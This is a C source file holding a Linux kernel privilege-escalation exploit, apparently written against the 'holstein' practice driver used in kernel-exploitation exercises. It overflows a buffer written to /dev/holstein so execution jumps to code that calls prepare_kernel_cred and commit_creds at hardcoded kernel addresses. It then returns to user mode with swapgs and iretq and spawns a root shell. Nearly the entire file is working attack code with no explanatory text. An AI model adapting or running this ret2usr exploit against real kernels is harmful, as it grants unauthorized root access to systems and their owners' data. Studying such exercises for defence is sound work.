#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

/* This exploit runs with principal security features disabled. */
unsigned long int user_rip, user_cs, user_rflags, user_rsp, user_ss;

static void shell() {
  puts("### ROOT SHELL ###");
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  execve("/bin/sh", argv, envp);
}

void save_user_state(){
	asm(
	"movq %%cs, %0\n\t"		
	"movq %%ss, %1\n\t"		
	"movq %%rsp, %2\n\t"
	"pushfq\n\t"	
	"popq %3\n\t" : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp), "=r" (user_rflags) : : "memory");

	printf("State of the userland registers\n\
	\rCS - %ld\n\
	\rSS - %ld\n\
	\rRSP - %ld\n\
	\rRFLAGS - %ld\n", user_cs, user_ss, user_rsp, user_rflags);
};

void restore_user_state(){
	asm(
	"swapgs;"
	"push %0\n\t"
	"push %1\n\t"
	"push %2\n\t"
	"push %3\n\t"
	"push %4\n\t"
	"iretq;"
	: :"r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(&shell) 
	);
};

static void swap(){
	char* (*prepare_kernel_cred)(int) =  (void *)(unsigned long)0xffffffff8106e240;
	void (*commit_creds)(char*)        = (void *)(unsigned long)0xffffffff8106e390;
	(*commit_creds)((*prepare_kernel_cred)(0));
	restore_user_state();
	shell();
}

int main(void){

	save_user_state();

	printf("Running the program...\n");
	int fd = open("/dev/holstein", O_RDWR);

	unsigned long int buff[130];
	*(unsigned long *)&buff[129] = (unsigned long *)&swap;

	/* send shellcode */
	write(fd, buff, sizeof(buff));

	close(fd);
		
	return 0;
}

